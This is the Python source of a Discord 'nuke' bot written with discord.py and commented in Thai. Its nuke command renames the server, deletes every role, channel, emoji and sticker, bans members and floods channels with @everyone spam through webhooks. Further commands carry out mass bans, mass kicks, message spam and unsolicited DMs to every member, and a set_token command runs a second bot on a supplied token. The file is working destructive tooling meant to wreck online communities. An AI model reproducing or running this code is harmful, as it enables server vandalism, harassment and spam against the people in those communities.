import discord
from discord.ext import commands
import asyncio
import aiohttp

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

ADMIN_ID = 1127935823195668480  # เปลี่ยนเป็น ID ของคุณ
TOKEN = None

class NukeCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.temp_bot = None

    @commands.command()
    @commands.is_owner()
    async def set_token(self, ctx, token: str):
        global TOKEN
        TOKEN = token
        await ctx.send("✅ Token ถูกตั้งค่าเรียบร้อย! บอทจะทำงานเป็นเวลา 5 นาที")
        
        # เปิดบอทชั่วคราว
        self.temp_bot = commands.Bot(command_prefix="!", intents=intents)
        
        @self.temp_bot.event
        async def on_ready():
            print(f"Temp bot logged in as {self.temp_bot.user}")
            
        asyncio.create_task(self.run_temp_bot())

    async def run_temp_bot(self):
        try:
            await self.temp_bot.start(TOKEN)
            await asyncio.sleep(300)  # ทำงาน 5 นาที
        except Exception as e:
            print(f"Error in temp bot: {e}")
        finally:
            await self.temp_bot.close()

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def nuke(self, ctx):
        if ctx.author.id != ADMIN_ID:
            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
            
        guild = ctx.guild
        
        # เปลี่ยนชื่อเซิร์ฟเวอร์
        await guild.edit(name="VDENA NUKED")
        
        # ลบรูปเซิร์ฟเวอร์
        await guild.edit(icon=None)
        await guild.edit(banner=None)
        await guild.edit(splash=None)
        
        # ลบทุก roles
        for role in guild.roles:
            try:
                await role.delete()
            except:
                continue
        
        # สร้าง role ใหม่
        await guild.create_role(name="VDENA", permissions=discord.Permissions.all())
        
        # เปลี่ยนชื่อสมาชิกทั้งหมด
        for member in guild.members:
            try:
                await member.edit(nick="VDENA NUKED")
            except:
                continue
        
        # ลบทุกช่องและหมวดหมู่
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                continue
        
        # สร้างช่องใหม่
        spam_channels = [
            "🚀-โดนแล้วจ้า-🚀",
            "💣-vdena-มาแล้ว-💣",
            "🔥-เซิร์ฟกระจอก-🔥",
            "😈-โดนแล้วหรอ-😈",
            "💀-rest-in-peace-💀"
        ]
        
        for name in spam_channels:
            await guild.create_text_channel(name)
        
        # ลบอีโมจิและสติกเกอร์ทั้งหมด
        for emoji in guild.emojis:
            await emoji.delete()
            
        for sticker in guild.stickers:
            await sticker.delete()
        
        # แบนสมาชิกแบบสุ่ม
        for member in guild.members:
            if member.id != ADMIN_ID and member.id != self.bot.user.id:
                try:
                    await member.ban(reason="VDENA NUKED")
                except:
                    continue
        
        # สร้างเว็บฮุกและสแปม
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name="VDENA_WEBHOOK")
                for _ in range(20):
                    await webhook.send("@everyone SERVER NUKED BY VDENA! https://discord.gg/vdena")
            except:
                continue
        
        await ctx.send("✅ เซิร์ฟเวอร์ถูกทำลายเรียบร้อย!")

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def massban(self, ctx):
        if ctx.author.id != ADMIN_ID:
            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
            
        for member in ctx.guild.members:
            if member.id != ADMIN_ID and member.id != self.bot.user.id:
                try:
                    await member.ban(reason="Mass ban by VDENA")
                except:
                    continue
        
        await ctx.send(f"✅ แบนสมาชิกทั้งหมด {len(ctx.guild.members)-2} คนเรียบร้อย!")

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def masskick(self, ctx):
        if ctx.author.id != ADMIN_ID:
            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
            
        for member in ctx.guild.members:
            if member.id != ADMIN_ID and member.id != self.bot.user.id:
                try:
                    await member.kick(reason="Mass kick by VDENA")
                except:
                    continue
        
        await ctx.send(f"✅ ไล่สมาชิกทั้งหมด {len(ctx.guild.members)-2} คนเรียบร้อย!")

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def spam(self, ctx, amount: int = 50):
        if ctx.author.id != ADMIN_ID:
            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
            
        for i in range(amount):
            await ctx.send(f"@everyone SERVER NUKED BY VDENA! {i+1}/{amount}")
            await asyncio.sleep(0.2)
        
        await ctx.send(f"✅ สแปมข้อความ {amount} ครั้งเรียบร้อย!")

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def dmall(self, ctx, *, message: str):
        if ctx.author.id != ADMIN_ID:
            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
            
        for member in ctx.guild.members:
            if member.id != ADMIN_ID and member.id != self.bot.user.id:
                try:
                    await member.send(message)
                except:
                    continue
        
        await ctx.send(f"✅ ส่งข้อความ DM ถึงสมาชิกทั้งหมด {len(ctx.guild.members)-2} คนเรียบร้อย!")

async def setup(bot):
    await bot.add_cog(NukeCommands(bot))